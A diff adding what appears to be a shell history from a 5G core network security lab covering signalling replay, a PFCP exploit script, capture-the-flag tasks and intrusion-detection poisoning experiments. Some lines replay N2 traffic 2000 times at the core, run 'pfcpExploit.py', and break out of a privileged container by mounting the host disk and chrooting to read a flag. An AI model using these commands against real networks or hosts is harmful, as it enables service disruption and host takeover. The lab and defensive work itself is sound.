@@ -1,0 +1,489 @@
+./register_subscriber.sh
+docker compose -f g1b1.yaml up -d
+docker logs mspremeainouona15nrrrdpeia 2>&1 | grep -i "Number of gNB-UEs"
+ps aux | grep tcpdump
+sudo kill -15 8876276
+sudo -v
+sudo nohup tcpdump -i any -w module3.pcap < /dev/null > /dev/null 2>&1 &
+cd /
+tar -cf - 5GReplay | md5sum
+find / -maxdepth 4 -type d -name "5GReplay" 2>/dev/null
+sudo find / -iname "*5greplay*" 2>/dev/null
+cd /home/noinr
+tar -cf - 5GReplay | md5sum
+cd /home/noinr
+tar -cf - 5Greplay | md5sum
+cd /home/noinr/5Greplay
+./5greplay info rules/forward-localhost.so
+cd /home/noinr/5greplay-0.0.1
+./5greplay info rules/forward-localhost.so
+grep -Rni "103" /home/noinr/5greplay-0.0.1 2>/dev/null | head -20
+tshark -r /home/noinr/5Greplay/pcap/5g-sa.pcap -Y gtp -T fields -e ip.dst | tail -n 1
+find /home/noinr/5Greplay -type f -iname "*.pcap"
+tshark -r /home/noinr/5Greplay/pcap/sa.pcap -Y gtp -T fields -e ip.dst | tail -n 1
+tshark -r /home/noinr/5Greplay/pcap/sa.pcap -Y gtp | tail
+sudo tshark -i any -Y "sctp && sctp.chunk_type==0"
+cd /home/noinr/5greplay-0.0.1
+find /home/noinr -type f -iname "*sa*.pcap" 2>/dev/null
+cd /home/noinr/5greplay-0.0.1
+sudo ./5greplay replay -t /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD
+sudo ./5greplay replay -t /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD
+sudo tshark -i any -Y "sctp"
+docker ps --format "table {{.Names}}\t{{.Networks}}\t{{.Ports}}"
+docker inspect mspremeainouona15nrrrdpeia --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
+tshark -r /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Y sctp -T fields -e ip.src -e ip.dst | sort -u
+cd /home/noinr/5greplay-0.0.1
+grep -nEi "127\.0\.0|ip|sctp|interface|forward" mmt-5greplay.conf
+cat mmt-5greplay.conf
+cd /home/noinr/5greplay-0.0.1
+sudo ./5greplay replay -t /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD
+sudo ./5greplay replay -t /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD 2>&1 | tee replay.log
+docker inspect mspremeainouona15nrrrdpeia --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
+grep -nEi "127\.0\.0\.5|38412|target-host|target-port|target-protocol" /home/noinr/5greplay-0.0.1/mmt-5greplay.conf
+cd /home/noinr/5greplay-0.0.1
+cp mmt-5greplay.conf mmt-5greplay.conf.bak
+sed -i 's/"127\.0\.0\.5"/"172.18.0.14"/' mmt-5greplay.conf
+grep -nE "target-protocols|target-hosts|target-ports" mmt-5greplay.conf
+sudo ./5greplay replay -t /home/noinr/5Greplay/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD
+ps aux | grep tcpdump
+sudo kill -15 5996589
+ps aux | grep tcpdump
+sudo -v
+sudo nohup tcpdump -i any -w module4.pcap < /dev/null > /dev/null 2>&1 &
+docker ps -q | xargs docker inspect --format '{{.Name}}  {{.AppArmorProfile}}'
+docker ps --format '{{.Names}}' | grep 5geo5og
+for c in $(docker ps --format '{{.Names}}' | grep 5geo5og); do   docker inspect "$c" --format '{{.Name}} {{.AppArmorProfile}}'; done
+cat /proc/version
+cat /etc/os-release
+grep PRETTY_NAME /etc/os-release
+docker --version
+docker version --format '{{.Server.Version}}'
+docker exec -it mspremeainouona15nrrrdpeia sh
+docker exec mspremeainouona15nrrrdpeia ss -ulnp
+sudo tcpdump -i any -nn 'not tcp and not udp'
+sudo kill -15 9587526
+MONGO_CONTAINER=d5armiom51s111nieeoogadu5gsp
+docker run -it --rm   --net dfoiaas5llpretddralsgmsrsner   -e DB_URI=mongodb://$MONGO_CONTAINER:27017/5geo5og   gradiant/55pttolsdeons:0.10.3   "55pttolsdeons showfiltered"
+docker ps --format '{{.Names}}' | grep -E 'smf|nssf'4
+docker exec -it irgrmrdriirps5agaigfogmifa
+grep -n -A10 "session:" /etc/5geo5og/smf.yaml
+docker exec irgrmrdriirps5agaigfogmifa sh -c 'grep -n "subnet:" /etc/5geo5og/smf.yaml'
+docker exec irgrmrdriirps5agaigfogmifa sh -c 'find / -type f -name "smf.yaml" 2>/dev/null'
+#docker exec irgrmrdriirps5agaigfogmifa sh -c 'find / -type f -name "smf.yaml" -exec grep -n "subnet:" {} \; 2>/dev/null'
+docker exec irgrmrdriirps5agaigfogmifa sh -c 'f=$(find / -type f -name "smf.yaml" 2>/dev/null | head -1); echo "$f"; grep -n -A20 "session:" "$f"'
+sudo -v
+sudo nohup tcpdump -i any -w module5.pcap < /dev/null > /dev/null 2>&1 &
+ps aux | grep tcpdump
+sudo kill -15 4323146
+ps aux | grep tcpdump
+sudo -v
+sudo nohup tcpdump -i any -w module6.pcap < /dev/null > /dev/null 2>&1 &
+whoami
+hostname
+pwd
+ip addr
+docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Ports}}"
+docker inspect oenggosfs5f
+docker inspect pugepfupngs
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' oenggosfs5f
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pugepfupngs
+ip addr
+ip route
+ss -lunp
+cat /etc/5geo5og/smf.yaml
+grep -n -A 10 -B 3 "pfcp" /etc/5geo5og/smf.yaml
+grep -n -A 20 "session" /etc/5geo5og/smf.yaml
+docker ps -a
+docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"
+docker ps -a | grep -i 5geo5og
+docker ps -a | grep -i smf
+ps aux | grep -i smf
+ps aux | grep -i smf
+sudo ss -lunp | grep 8805
+docker ps -a
+ls -l /etc/5geo5og/
+sudo ss -lunp | grep 8805
+docker ps
+docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"
+docker ps | grep -Ei "uu|snseiimm|nr-uu"
+docker exec -it euuaaerausa bash
+ps aux | grep tcpdump
+docker exec -it grru5rsa1nosurpgs51ssog1n bash
+docker exec -it b322a6115bd0 bash
+docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}"
+docker exec -it ggpepgnoaneaus5eppm1andpa5 bash
+\docker exec -it ui1niore5iiaudandim5su51rsn bash
+cat pfcpExploit.py | grep -i seid
+docker exec ggpepgnoaneaus5eppm1andpa5 find / -name "pfcpExploit.py" 2>/dev/null
+for c in $(docker ps --format "{{.Names}}"); do     echo "=== $c ===";     docker exec $c find / -name "pfcpExploit.py" 2>/dev/null; done
+docker exec -it ggpepgnoaneaus5eppm1andpa5 bash
+docker exec -it ui1niore5iiaudandim5su51rsn bash
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' euuibdioo1beebaesmobmrmn5n
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mns1aifs1r5erp5drg1noou5mi
+docker exec mns1aifs1r5erp5drg1noou5mi ss -lunp | grep 8805
+docker exec mns1aifs1r5erp5drg1noou5mi tcpdump -i any udp port 8805
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mns1aifs1r5erp5drg1noou5mi
+python3 pfcpExploit.py --nbg-ip <nbg-ip> --fuupip <fuupip>
+ping -I uesimtun0 8.8.8.8
+for c in $(docker ps --format "{{.Names}}"); do echo "===== $c ====="; docker exec $c find / -name "pfcpExploit.py" 2>/dev/null; done
+docker exec -it ggpepgnoaneaus5eppm1andpa5 bash
+docker exec -it ui1niore5iiaudandim5su51rsn bash
+ip addr
+which arp-scan
+arp-scan --localnet --interface eth0
+apt update
+apt install arp-scan
+arp-scan --localnet --interface eth0
+docker network ls
+euuibdioo1beebaesmobmrmn5n
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' euuibdioo1beebaesmobmrmn5n
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' euuibdioo1beebaesmobmrmn5n
+docker network inspect <network_name>
+docker exec -it ui1niore5iiaudandim5su51rsn bash
+nr-uu -c uu.yaml -n 3 > /dev/null &
+nr-uu -c /etc/snseiimm/uu.yaml -n 3 > /dev/null &
+ip a
+ip a | grep uesimtun
+ip route
+ping -I uesimtun0 8.8.8.8
+find / -name nr-uu 2>/dev/null
+ps aux | grep nr-uu
+ip a | grep uesimtun
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+docker ps | grep webui
+docker port wbaws15na5rm1umoponsrrswirsu
+docker inspect wbaws15na5rm1umoponsrrswirsu | grep HostPort
+docker exec -it mspremeainouona15nrrrdpeia bash
+docker exec -it euuibdioo1beebaesmobmrmn5n bash
+docker ps --format "table {{.Names}}\t{{.Status}}" | grep -i nbg
+ip a
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <gNB2_CONTAINER_NAME>
+iptables -A INPUT -s <gNB2-IP> -m limit --limit 5/min -j LOG --log-prefix "BLOCKED: " --log-level 4
+iptables -A INPUT -s <gNB2-IP> -j DROP
+docker ps --format "table {{.Names}}\t{{.Status}}" | grep -i nbg
+ip a | grep uesimtun
+tcpdump -i any -nn
+iptables -L INPUT -n -v
+tcpdump -i uesimtun3
+iptables -A INPUT -s <g1b1-ip> -m limit --limit 5/min -j LOG --log-prefix "BLOCKED: " --log-level 4 -j DROP
+tcpdump -i uesimtun3
+iptables -A INPUT -s <g1b1-ip> -m limit --limit 5/min -j LOG --log-prefix "BLOCKED: " --log-level 4 -j DROP
+sudo kill -15 4996581
+ps aux | grep tcpdump
+sudo -v
+sudo nohup tcpdump -i any -w module7.pcap < /dev/null > /dev/null 2>&1 &
+docker ps
+docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"
+docker ps -q | while read c; do     echo "==== $c ====";     docker inspect $c | grep Privileged; done
+docker inspect <container_name> | grep CapAdd -A10
+docker inspect <container_name> | grep -i privileged -A5
+docker exec -it <container_name> bash
+docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Image}}"
+for c in $(docker ps -q); do     echo "===== $(docker inspect -f '{{.Name}}' $c) =====";     docker inspect $c | grep Privileged; done
+docker ps --format "table {{.Names}}\t{{.Image}}"
+docker ps -q | while read c; do     echo "===== $(docker inspect -f '{{.Name}}' $c) =====";     docker inspect $c --format='Privileged={{.HostConfig.Privileged}}'; done
+docker ps -q | while read c; do     echo "===== $(docker inspect -f '{{.Name}}' $c) =====";     docker inspect $c | grep docker.sock; done
+docker inspect ggpepgnoaneaus5eppm1andpa5 | grep -A5 Mounts
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+docker exec -it ui1niore5iiaudandim5su51rsn bash
+docker exec -it mns1aifs1r5erp5drg1noou5mi find / -name "pfcpExploit.py" 2>/dev/null
+find / -name "pfcpExploit.py" 2>/dev/null
+[200~from scapy.all import *~
+from scapy.all import *
+for c in $(docker ps --format "{{.Names}}"); do echo "=== $c ==="; docker exec $c find / -name "pfcpExploit.py" 2>/dev/null; done
+cat pfcpExploit.py | grep -i seid
+find / -name "pfcpExploit.py" 2>/dev/null
+docker exec mns1aifs1r5erp5drg1noou5mi find / -name "pfcpExploit.py" 2>/dev/null
+docker exec mns1aifs1r5erp5drg1noou5mi find / -iname "*pfcp*" 2>/dev/null
+docker exec -it ggpepgnoaneaus5eppm1andpa5 bash
+ls /
+find / -name pfcpExploit.py 2>/dev/null
+cat pfcpExploit.py
+python3 pfcpExploit.py --nbg-ip <ip> --fuupip <ip>
+find / -name "ngc.yml" 2>/dev/null
+docker inspect mns1aifs1r5erp5drg1noou5mi | grep -i privileged
+docker inspect mns1aifs1r5erp5drg1noou5mi
+docker inspect mns1aifs1r5erp5drg1noou5mi
+find ~ -name "*.yml" -o -name "*.yaml" 2>/dev/null | head -30
+docker inspect mns1aifs1r5erp5drg1noou5mi
+docker exec -it mspremeainouona15nrrrdpeia bash
+docker inspect mspremeainouona15nrrrdpeia | grep Privileged
+[200~docker exec -it mns1aifs1r5erp5drg1noou5mi bash~
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+docker exec -it mspremeainouona15nrrrdpeia bash
+docker exec -it mspremeainouona15nrrrdpeia bash
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+docker inspect mns1aifs1r5erp5drg1noou5mi | grep Privileged
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+mount -t devtmpfs devtmpfs /dev
+mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt
+chroot /mnt /bin/bash
+cat /flag.txt
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt
+ls /dev/mapper/
+mount /dev/mapper/ubuntu--vg-ubuntu--lv /mnt
+cat /flag.txt
+docker exec mns1aifs1r5erp5drg1noou5mi ls /dev/mapper/
+docker compose down
+docker compose -f ngc.yml down
+find ~ -name "ngc.yml" 2>/dev/null
+nano ngc.yml
+docker inspect mns1aifs1r5erp5drg1noou5mi --format='Privileged={{.HostConfig.Privileged}}'
+exit
+find ~ -name "*.yml" -o -name "*.yaml" 2>/dev/null
+find / -name "ngc.yml" 2>/dev/null
+nano ngc.yml
+docker compose down
+docker ps
+docker inspect mns1aifs1r5erp5drg1noou5mi | grep -A5 CapAdd
+pwd
+ls -la
+find / -name "ngc.yml" 2>/dev/null
+docker compose -f ngc.yml down
+docker compose -f ngc.yml up -d
+docker ps
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+mount -t devtmpfs devtmpfs /dev
+capsh --print
+cat /proc/self/status | grep Cap
+docker inspect mns1aifs1r5erp5drg1noou5mi --format='Privileged={{.HostConfig.Privileged}}'
+docker inspect mns1aifs1r5erp5drg1noou5mi | grep -A5 CapAdd
+sudo kill -15 8839224
+sudo -v
+sudo nohup tcpdump -i any -w module8.pcap < /dev/null > /dev/null 2>&1 &
+docker ps
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+ip a
+tcpdump -i any -w traffic.pcap
+tcpdump -i ogstun -w traffic.pcap
+docker exec -it ggpepgnoaneaus5eppm1andpa5 bash
+ip a | grep uesimtun
+ping -I uesimtun0 8.8.8.8
+find / -iname "*flow*" 2>/dev/null
+find / -iname "*.py" 2>/dev/null
+python3 --version
+pip list
+docker exec -it mns1aifs1r5erp5drg1noou5mi bash
+which tshark
+apt update
+apt install tshark
+apt update
+apt install tshark
+tshark -i any -T fields -e frame.time -e ip.src -e ip.dst -e ip.proto -e ip.len -e tcp.srcport -e tcp.dstport -e icmp.type -Y ip -c 200 -E header=y -E separator=, > raw_capture.csv
+ls -lh raw_capture.csv
+wc -l raw_capture.csv
+head raw_capture.csv
+ip a
+tshark -D
+tshark -D
+ping -c 100 8.8.8.8
+wc -l raw_capture.csv
+head raw_capture.csv
+ls -lh
+python3 --version
+python3 -c "import pandas; print(pandas.__version__)"
+pip3 install pandas
+nano preprocess.py
+python3 preprocess.py
+pip install pandas
+sudo apt install python3-pip
+python3 preprocess.py
+wc -l labeled_flows.csv
+ls -lh labeled_flows.csv
+python3 -c "import sklearn; print(sklearn.__version__)"
+nano train_ids.py
+python3 train_ids.py
+nano train_poisoned_ids.py
+python3 train_poisoned_ids.py
+print("Poisoned samples:", flip_count)
+nano train_poisoned_ids.py
+python3 train_poisoned_ids.py
+flood_test_indices = y_test[y_test == 'ICMP_FLOOD'].index
+misclass = (poisoned_preds[flood_test_indices] == 'Benign').sum()
+asr = misclass / len(flood_test_indices) if len(flood_test_indices) > 0 else 0
+print(f"ASR: {asr:.4f}")
+sudo kill -15 1651740
+sudo -v
+sudo nohup tcpdump -i any -w example.pcap < /dev/null > /dev/null 2>&1 &
+find / -name "smf.yaml" 2>/dev/null
+ss -an | grep 38412
+systemctl status 5nefnpg5nnpd
+ip addr
+docker ps
+ss -an | grep 38412
+ls -lh labeled_flows.csv
+-rw-r--r-- 1 user user 25M labeled_flows.csv
+find . -type f | grep -E "model|pickle|pkl|joblib"
+ls -la
+python3 --version
+python3 -c "import pandas; print(pandas.__version__)"
+import pandas as pd
+df = pd.read_csv("labeled_flows.csv")
+print(df.shape)
+print(df.head())
+print(df.columns)
+ls -lh labeled_flows.csv
+find . -type f | grep -E "model|pkl|joblib"
+python3 -c "import pandas as pd; print(pd.read_csv('labeled_flows.csv').shape)"
+print(df_test.columns)
+print(df_test['label'].value_counts())
+flood_idx = df_test[df_test['label']=="ICMP_FLOOD"].index
+print(len(flood_idx))
+print(df_test.loc[flood_idx, 'ip_len'].head())
+perturbed_test = df_test.copy()
+perturbed_test.loc[flood_idx,'ip_len'] *= 0.5
+print(perturbed_test.loc[flood_idx,'ip_len'].head())
+print(X_train.shape)
+print(X_test.shape)
+print(y_train.shape)
+print(y_test.shape)
+print(X_train.columns)
+print(y_train.value_counts())
+flood_train_idx = y_train[y_train == 'ICMP_FLOOD'].index
+print(len(flood_train_idx))
+print(X_train.loc[flood_train_idx,'ip_len'].head())
+print(type(robust_model))
+robust_evasion_rate = (
+    robust_evaded_preds[flood_idx] == 'Benign'
+).mean()
+print(f"Robust Evasion Rate: {robust_evasion_rate:.4f}")
+improvement = 0.75 - robust_evasion_rate
+print(f"Evasion Reduction: {improvement:.4f}")
+print(aug_X.shape)
+print(aug_y.shape)
+print(aug_X.columns)
+from sklearn.ensemble import RandomForestClassifier
+print("Random Forest available")
+from sklearn.ensemble import RandomForestClassifier
+ensemble_model = RandomForestClassifier(
+    n_estimators=10,
+    random_state=42,
+    class_weight='balanced'
+)
+ensemble_model.fit(aug_X, aug_y)
+print(len(ensemble_model.estimators_))
+print(ensemble_model.classes_)
+ICMP_FLOOD = index 1
+from sklearn.metrics import confusion_matrix
+cm = confusion_matrix(
+    y_test,
+    ensemble_preds
+)
+print(cm)
+ensemble_model.classes_
+classes = list(ensemble_model.classes_)
+icmp_index = classes.index('ICMP_FLOOD')
+tp_icmp = cm[icmp_index, icmp_index]
+print("ICMP_FLOOD TP:", tp_icmp)
+from sklearn.metrics import classification_report
+print(
+    classification_report(
+        y_test,
+        ensemble_preds
+    )
+)
+adv_preds = ensemble_model.predict(
+    perturbed_test[['proto','ip_len','frame_len']]
+)
+adv_cm = confusion_matrix(
+    perturbed_test['label'],
+    adv_preds
+)
+print(adv_cm)
+sudo kill -15 3425746
+sudo -v
+sudo nohup tcpdump -i any -w module9.pcap < /dev/null > /dev/null 2>&1 &
+ls -lh
+find . -type f | grep -E "model|pkl|joblib|pickle"
+ls -lh labeled_flows.csv
+python3 -c "import pandas as pd; print(pd.read_csv('labeled_flows.csv').shape)"
+python3 -c "import sklearn; print(sklearn.__version__)"
+python3 -c "import pandas, numpy; print('OK')"
+import pandas as pd
+df = pd.read_csv('labeled_flows.csv')
+print(df.shape)
+print(df.head())
+print(X_test.shape)
+print(df_test['label'].value_counts())
+find . -name "labeled_flows.csv"
+ls
+print(df_test['label'].value_counts())
+evaded_preds = model.predict(
+    perturbed_test[['proto','ip_len','frame_len']]
+)
+ip a
+whoami
+evasion_rate = (
+    evaded_preds[flood_idx] == 'Benign'
+).mean()
+print(f"Evasion Rate: {evasion_rate:.4f}")
+print(X_train.shape)
+print(y_train.shape)
+print(y_train.value_counts())
+perturbed_train = X_train.copy()
+perturbed_train.loc[
+    flood_train_idx,
+    'ip_len'
+] *= 0.8
+pwd
+ls -la
+find . -name "labeled_flows.csv"
+cd data
+λσ
+;s
+ls
+jupyter notebook
+import pandas as pd
+print(type(robust_model))
+sudo kill -15 8357797
+sudo -v
+sudo nohup tcpdump -i any -w extramodule.pcap < /dev/null > /dev/null 2>&1 &
+sudo apt update && sudo apt install -y wget
+wget https://github.com/Montimage/5GReplay/releases/download/v0.0.1/5greplay-0.0.1_Linux_x86_64.tar.gz
+ls -lh
+tar -xzf 5greplay-0.0.1_Linux_x86_64.tar.gz
+ls -la
+chmod +x 5greplay
+./5greplay --version
+ls -la
+find ~ -name "5greplay" 2>/dev/null
+chmod +x 5greplay
+./5greplay --version
+cd g1pyre5lpgyeyyey
+ls -la
+-rwxr-xr-x  5greplay
+./5greplay --version
+wget https://github.com/Montimage/5GReplay/raw/main/docs/docs/tutorial/replay-5geo5og/5g-sa.pcap
+ls -lh 5g-sa.pcap
+tshark --version
+sudo apt update
+sudo apt install -y tshark
+tshark -r 5g-sa.pcap -Y gtp
+sudo tcpdump -i any -nn -v sctp
+cd g1pyre5lpgyeyyey
+sudo ./5greplay replay -t 5g-sa.pcap -Xforward.nb-copies=2000 -Xforward.default=FORWARD
+sudo tshark -i any -Y sctp
+sudo tshark -i any -Y sctp -V | grep PPID
+tshark -r 5g-sa.pcap -Y sctp -V | grep PPID
+tshark -r 5g-sa.pcap -Y sctp -T fields -e sctp.ppi
+sudo tshark -i any -Y sctp -V | grep PPID
+exit
+sudo kill -15 8536951
+ps aux | grep tcpdump
+sudo kill -15 9277265
+ps aux | grep tcpdum
+ls
+exit
+ifconfig
+ls
+cd ..
+ls
+ls -a
+ls -l
+df -h
+cp example.pcap backup1.pcap
+ls
+ls -a
+ls -l
